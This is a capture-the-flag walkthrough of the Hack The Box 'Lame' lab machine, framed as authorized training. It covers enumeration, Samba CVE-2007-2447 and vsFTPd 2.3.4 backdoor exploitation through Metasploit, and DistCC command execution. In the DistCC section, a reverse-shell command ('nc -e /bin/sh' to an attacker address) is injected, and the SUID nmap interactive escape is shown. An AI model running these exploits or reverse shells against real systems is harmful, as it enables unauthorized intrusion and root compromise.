# Hack The Box - Lame Writeup

> A complete walkthrough of the **Lame** machine from Hack The Box, covering enumeration, SMB exploitation, alternative attack paths, and multiple privilege escalation techniques.

---

## Machine Information

| Platform     | Machine | Difficulty | OS    |
| ------------ | ------- | ---------- | ----- |
| Hack The Box | Lame    | Easy       | Linux |

---

# 📌 Overview

**Lame** is one of the classic Hack The Box machines and provides an excellent introduction to enumeration and exploitation of outdated network services.

The machine exposes several interesting services, including:

* FTP
* SSH
* SMB

During enumeration, multiple vulnerable services and attack vectors can be discovered. The primary exploitation path targets an outdated version of **Samba**, allowing remote command execution as `root`.

Additional attack vectors discovered during the assessment include:

* vsFTPd 2.3.4 Backdoor
* Samba Usermap Script RCE
* DistCC Remote Command Execution
* SUID Nmap Privilege Escalation

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Service Enumeration](#-service-enumeration)
* [FTP Enumeration](#-ftp-enumeration)
* [SMB Enumeration](#-smb-enumeration)
* [Primary Exploitation - Samba](#-primary-exploitation---samba)
* [User Flag](#-user-flag)
* [Alternative Attack Paths](#-alternative-attack-paths)

  * [vsFTPd 2.3.4 Backdoor](#vsftpd-234-backdoor)
  * [DistCC Exploitation](#distcc-exploitation)
  * [SUID Nmap](#suid-nmap-privilege-escalation)
* [Root Access](#-root-access)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target machine IP:

```text
10.129.75.232
```

---

## Full Port Scan

Starting with an Nmap scan to identify open ports.

```bash
nmap -p- --min-rate 5000 10.129.75.232
```

### Result

```text
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The following services are exposed:

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 139  | NetBIOS |
| 445  | SMB     |

---

# 🔎 Service Enumeration

Let's perform a detailed service and version scan.

```bash
nmap -sC -sV -p21,22,139,445 10.129.75.232
```

### Important Results

```text
21/tcp  open  ftp
vsftpd 2.3.4

22/tcp  open  ssh
OpenSSH 4.7p1 Debian

139/tcp open  netbios-ssn
Samba smbd 3.X - 4.X

445/tcp open  netbios-ssn
Samba smbd 3.0.20-Debian
```

Two major findings immediately stand out:

```text
vsFTPd 2.3.4
Samba 3.0.20
```

Both are very old versions and should be investigated for known vulnerabilities.

---

# 📂 FTP Enumeration

The Nmap scan revealed:

```text
Anonymous FTP login allowed
```

Let's connect to the FTP service.

```bash
ftp 10.129.75.232
```

Anonymous login was successful.

Checking the available files:

```bash
ls
ls -lah
```

Output:

```text
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
```

The FTP server did not expose any immediately useful files.

Therefore, the next focus was SMB.

---

# 🔍 SMB Enumeration

Starting with `enum4linux`.

```bash
enum4linux 10.129.75.232
```

Interesting usernames discovered:

```text
klog
tomcat55
```

Next, let's check available SMB shares.

```bash
smbclient -L 10.129.75.232 -N
```

Anonymous authentication was successful.

### Available Shares

```text
Sharename       Type
---------       ----
print$          Disk
tmp             Disk
opt             Disk
IPC$            IPC
ADMIN$          IPC
```

The `tmp` share looked interesting.

---

## Accessing the SMB Share

```bash
smbclient //10.129.75.232/tmp -N
```

Listing the contents:

```bash
ls
```

Output:

```text
.
..
orbit-makis
5808.jsvc_up
.ICE-unix
vmware-root
.X11-unix
gconfd-makis
.X0-lock
vgauthsvclog.txt.0
```

Although the SMB shares exposed files from the internal system, no immediate path was found through manual file enumeration.

However, the Samba version discovered earlier was extremely interesting:

```text
Samba smbd 3.0.20-Debian
```

---

# 💥 Primary Exploitation - Samba

The Samba version:

```text
Samba 3.0.20
```

is vulnerable to:

```text
CVE-2007-2447
```

This vulnerability affects Samba's username mapping functionality and can lead to remote command execution.

A Metasploit module is available:

```text
exploit/multi/samba/usermap_script
```

---

## Exploitation with Metasploit

Start Metasploit:

```bash
msfconsole
```

Select the exploit:

```text
use exploit/multi/samba/usermap_script
```

Configure the target:

```text
set RHOSTS 10.129.75.232
set LHOST <YOUR_IP>
```

Run the exploit:

```text
exploit
```

Successful exploitation resulted in a shell:

```text
id
uid=0(root) gid=0(root)
```

We immediately obtained:

```text
root
```

---

# 🚩 User Flag

Since we already had root access, we could navigate to the user directory.

```bash
cd /home/makis
ls
```

Output:

```text
user.txt
```

Read the flag:

```bash
cat user.txt
```

---

# 👑 Root Access

Since the initial Samba exploit already provided a root shell:

```text
uid=0(root) gid=0(root)
```

The root flag could be accessed directly.

```bash
cd /root
cat root.txt
```

At this stage, the machine was fully compromised.

---

# 🔀 Alternative Attack Paths

One interesting aspect of the Lame machine is that it contains multiple vulnerable services and possible exploitation paths.

Further enumeration revealed additional services running internally.

Running:

```bash
ss -tunlp
```

revealed several listening services:

```text
512
513
514
8009
6697
2121
1099
6667
139
5900
80
3632
8180
1524
21
23
5432
25
445
```

Some of these services were filtered from external access but became visible after obtaining initial access.

---

# vsFTPd 2.3.4 Backdoor

The FTP service was running:

```text
vsFTPd 2.3.4
```

This version is widely known for a maliciously introduced backdoor.

A Metasploit module exists:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

Running the module:

```text
use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 10.129.75.232
set LHOST <YOUR_IP>

exploit
```

The module detected the vulnerable banner:

```text
220 (vsFTPd 2.3.4)
```

However, the initial attempt could not connect to the backdoor service:

```text
Unable to connect to backdoor on 6200/TCP
```

After obtaining access to the machine and testing locally, port `6200` was reachable.

```bash
nc 127.0.0.1 6200
```

Checking privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

This demonstrated another possible route to root access.

---

# ⚙️ DistCC Exploitation

Further full-port enumeration identified another interesting service:

```text
3632/tcp open  distccd
```

Version information:

```text
distccd v1
GNU 4.2.4
```

Port `3632` is associated with the **DistCC daemon**, a service used for distributed compilation.

Searching for known vulnerabilities revealed a Metasploit module:

```text
exploit/unix/misc/distcc_exec
```

---

## Nmap Script Exploitation

A custom Nmap NSE script was also used.

```bash
wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse \
-O /usr/share/nmap/scripts/distcc-exec.nse
```

Then execute:

```bash
nmap -p 3632 10.129.75.232 \
--script distcc-exec \
--script-args="distcc-exec.cmd='nc -e /bin/sh <YOUR_IP> 443'"
```

Start a listener:

```bash
nc -lvnp 443
```

A shell was received.

Checking the user:

```bash
id
```

Output:

```text
uid=1(daemon) gid=1(daemon)
```

We obtained access as:

```text
daemon
```

---

## Shell Stabilization

Upgrade the shell using Python.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```text
CTRL + Z
```

Configure the local terminal:

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

The shell was now more stable and interactive.

---

# 🔐 SUID Nmap Privilege Escalation

While enumerating the system, SUID binaries were checked.

```bash
find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null -ls
```

An interesting binary was discovered:

```text
/usr/bin/nmap
```

The permissions showed:

```text
-rwsr-xr-x root root /usr/bin/nmap
```

This version of Nmap supports interactive mode.

Since Nmap was running with the SUID bit set, its effective UID could become root.

---

## Exploiting Interactive Nmap

Run:

```bash
nmap --interactive
```

Inside interactive mode:

```text
!/bin/sh
```

Example:

```text
nmap --interactive

Starting Nmap V. 4.53

nmap> !/bin/sh
```

Checking privileges:

```bash
id
```

Output:

```text
uid=1(daemon) gid=1(daemon) euid=0(root)
```

We successfully escalated privileges to root.

---

# 🗺️ Attack Path Summary

## Primary Intended Path

```text
┌──────────────────────┐
│    Nmap Scan         │
│                      │
│ FTP / SSH / SMB      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ SMB Enumeration      │
│                      │
│ Samba 3.0.20         │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ CVE-2007-2447        │
│                      │
│ Samba Usermap Script │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Remote Code Execution│
│                      │
│ Root Shell           │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ user.txt + root.txt  │
└──────────────────────┘
```

---

# 🔀 Alternative Attack Paths

```text
                    ┌─────────────────┐
                    │   Lame Machine  │
                    └────────┬────────┘
                             │
          ┌──────────────────┼──────────────────┐
          │                  │                  │
          ▼                  ▼                  ▼
     Samba 3.0.20       vsFTPd 2.3.4        DistCC
          │                  │                  │
          ▼                  ▼                  ▼
    CVE-2007-2447       Backdoor          RCE Exploit
          │                  │                  │
          ▼                  ▼                  ▼
        ROOT               ROOT              daemon
                                               │
                                               ▼
                                          SUID Nmap
                                               │
                                               ▼
                                             ROOT
```

---

# 🛠️ Tools Used

```text
Nmap
Enum4linux
SMBClient
FTP
Metasploit Framework
Netcat
Python
Nmap NSE Scripts
Linux Enumeration Commands
```

---

# 🧠 Key Takeaways

This machine demonstrates several fundamental penetration testing concepts.

### 🔹 Enumeration is Critical

Service versions revealed the primary vulnerabilities:

```text
vsFTPd 2.3.4
Samba 3.0.20
DistCC
```

Always perform proper:

* Port scanning
* Version detection
* SMB enumeration
* Share enumeration

---

### 🔹 Outdated Services Are Dangerous

Multiple old services were running with known public exploits.

Examples:

```text
CVE-2007-2447 - Samba Usermap Script
vsFTPd 2.3.4 Backdoor
DistCC Remote Code Execution
```

---

### 🔹 Multiple Paths Can Exist

Even after obtaining root through Samba, further enumeration revealed multiple alternative paths.

This is an important lesson:

> Never stop enumerating after finding one vulnerability.

Additional enumeration can reveal:

* Alternative exploitation methods
* Different privilege escalation paths
* Internal-only services
* Misconfigured binaries
* Interesting file permissions

---

### 🔹 SUID Binaries Require Attention

The SUID Nmap binary allowed a low-privileged user to execute commands with elevated privileges.

Always check:

```bash
find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null
```

---

# 📚 Vulnerabilities Identified

| Vulnerability         | Service      | Impact                   |
| --------------------- | ------------ | ------------------------ |
| CVE-2007-2447         | Samba 3.0.20 | Remote Code Execution    |
| vsFTPd Backdoor       | vsFTPd 2.3.4 | Root Access              |
| DistCC RCE            | distccd      | Remote Command Execution |
| SUID Misconfiguration | Nmap         | Privilege Escalation     |

---

# 🏁 Final Notes

Hack The Box **Lame** is an excellent machine for understanding the importance of proper enumeration.

The machine contains several intentionally vulnerable services, demonstrating how an attacker can identify outdated software versions and map them to known vulnerabilities.

The primary attack path was straightforward:

```text
Enumeration
    ↓
Identify Samba 3.0.20
    ↓
Find CVE-2007-2447
    ↓
Exploit Usermap Script
    ↓
Root Access
```

However, deeper enumeration revealed multiple alternative paths involving FTP, DistCC, and SUID misconfigurations.

This machine reinforces one of the most important penetration testing principles:

> **Enumerate thoroughly. Verify everything. Never assume there is only one path to compromise.**

---

## ⚠️ Disclaimer

This writeup was created strictly for **educational purposes** and documents techniques performed against the intentionally vulnerable **Hack The Box Lame** machine in an authorized lab environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking! 🚩</b>
</p>
